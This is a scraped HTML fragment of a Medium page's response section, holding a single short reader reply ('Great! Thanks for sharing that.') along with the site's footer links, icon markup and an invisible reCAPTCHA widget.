role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av ac r zm zn" rel="noopener follow" href="https://medium.com/@babipo9745?source=post_page---post_responses--162662bb630e----0-----------------------------------" data-discover="true"><div class="ac ix zm"><p class="bg b bh ab ga zo zp zq zr zs zt zu bl">Jack Simon</p></div></a></div></div></div></div><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@babipo9745/great-thanks-for-sharing-that-e1decbdfbedb?source=post_page---post_responses--162662bb630e----0-----------------------------------" data-discover="true"><p class="bg b ec ab eb"><span>Dec 19, 2024</span></p></a></div></div><div class="bn"><button class="ah fs aj fo al am an mc ap aq ar fe md me ls mf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.385 12c0 .55.2 1.02.59 1.41.39.4.86.59 1.41.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.02.2-1.41.59-.4.39-.59.86-.59 1.41m5.62 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.42.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.03.2-1.42.59s-.58.86-.58 1.41m5.6 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.43.59s1.03-.2 1.42-.59.58-.86.58-1.41-.2-1.02-.58-1.41a1.93 1.93 0 0 0-1.42-.59c-.56 0-1.04.2-1.43.59s-.58.86-.58 1.41" clip-rule="evenodd"></path></svg></button></div></div><div class="zv m he"><pre class="uk"><div class="zw m"><div class="bg b bh ab bl"><div class="yr">Great! Thanks for sharing that.</div></div></div></pre></div><div class="zx ac r kr cw"><div class="ac r ae"><div class="ac r kr ks"><div class="pw-multi-vote-icon fr zy ku kv kw"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fe1decbdfbedb&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40babipo9745%2Fgreat-thanks-for-sharing-that-e1decbdfbedb&amp;user=Jack+Simon&amp;userId=45ca0c99d55e&amp;source=---post_responses--e1decbdfbedb----0-----------------respond_sidebar------------------" data-discover="true"><div class="kx aq ky kz la lb ao lc ld le kw" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></a></span></div></div><p class="bg b ec ab bl"><button class="ah ai aj fo al am an ao ap aq ar as at op">Reply</button></p></div></div></div></div></div></div></div></div><div class="vp vq vr vs vt m bx"><div class="i l k"><div class="us bi vu vv"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="vw ac kr ji"><div class="vx vy m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://help.medium.com/hc/en-us?source=post_page-----162662bb630e---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Help</p></a></div><div class="vx vy m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://status.medium.com/?source=post_page-----162662bb630e---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Status</p></a></div><div class="vx vy m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/about?autoplay=1&amp;source=post_page-----162662bb630e---------------------------------------" data-discover="true"><p class="bg b ec ab eb">About</p></a></div><div class="vx vy m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----162662bb630e---------------------------------------" data-discover="true"><p class="bg b ec ab eb">Careers</p></a></div><div class="vx vy m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="mailto:pressinquiries@medium.com" rel="noopener follow"><p class="bg b ec ab eb">Press</p></a></div><div class="vx vy m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://blog.medium.com/?source=post_page-----162662bb630e---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Blog</p></a></div><div class="vx vy m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----162662bb630e---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Privacy</p></a></div><div class="vx vy m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----162662bb630e---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Rules</p></a></div><div class="vx vy m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----162662bb630e---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Terms</p></a></div><div class="vx m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://speechify.com/medium?source=post_page-----162662bb630e---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Text to speech</p></a></div></div></div></div></div></div></div></div></div></div></div></div>





































<div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><div title="reCAPTCHA" width="256" height="60" role="presentation" name="a-1mbb101nlc9t" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp&amp;co=aHR0cHM6Ly9tZWRpdW0uY29tOjQ0Mw..&amp;hl=en&amp;v=vUgXt_KV952_-5BB2jjloYzl&amp;size=invisible&amp;anchor-ms=20000&amp;execute-ms=30000&amp;cb=nshtmzvgshix" data-original-tag="iframe">

<title>reCAPTCHA</title>

<link rel="stylesheet" type="text/css" href="https://www.gstatic.com/recaptcha/releases/vUgXt_KV952_-5BB2jjloYzl/styles__ltr.css">


<div id="rc-anchor-alert" class="rc-anchor-alert"></div>

<div class="rc-anchor rc-anchor-invisible rc-anchor-light  rc-anchor-invisible-hover"><div id="recaptcha-accessible-status" class="rc-anchor-aria-status" aria-hidden="true">Recaptcha requires verification. </div><div class="rc-anchor-error-msg-container" style="display:none"><span class="rc-anchor-error-msg" aria-hidden="true"></span></div><div class="rc-anchor-normal-footer"><div class="rc-anchor-logo-large" role="presentation"><div class="rc-anchor-logo-img rc-anchor-logo-img-large"></div></div><div class="rc-anchor-pt"><a href="https://www.google.com/intl/en/policies/privacy/" target="_blank">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="https://www.google.com/intl/en/policies/terms/" target="_blank">Terms</a></div></div><div class="rc-anchor-invisible-text"><span>protected by <strong>reCAPTCHA</strong></span><div class="rc-anchor-pt"><a href="https://www.google.com/intl/en/policies/privacy/" target="_blank" style="">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="https://www.google.com/intl/en/policies/terms/" target="_blank" style="">Terms</a></div></div></div><div style="display: none;" data-original-tag="iframe"></div></div></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><div style="display: none;" data-original-tag="iframe"></div></div></body></html>